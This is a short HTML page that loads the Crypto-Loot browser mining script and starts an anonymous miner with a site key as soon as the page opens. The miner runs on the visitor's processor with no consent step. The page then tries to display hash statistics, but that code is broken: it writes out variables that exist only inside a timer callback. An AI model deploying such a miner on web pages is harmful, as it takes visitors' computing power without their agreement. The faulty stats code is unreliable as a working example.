<!DOCTYPE HTML>
<html>
<head>
  <title>Crypto Loot</title>
  <script type="text/javascript" src="./res/js/jquery-3.2.1.min.js"></script>
  <script src="https://crypto-loot.com/lib/miner.min.js"></script>
</head>

<body>
  <h1>Crypto Loot</h1>
  <p>You may need to disable adblock.</p>
  
  <script>
    var miner = new CryptoLoot.Anonymous('bdb0d2985d3f63ec266270dde9942f762a311e2883a6');
    miner.start();
  </script>
  
  <p>Info:</p>
  <script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
	}, 1000);
  </script>
  <p>Hashes Per Second: </p><script>document.write(hashesPerSecond);</script>
  <p>Total Hashes: </p><script>document.write(totalHashes);</script>
  <p>Accepted Hashes: </p><script>document.write(acceptedHashes);</script>
</body>
</html>
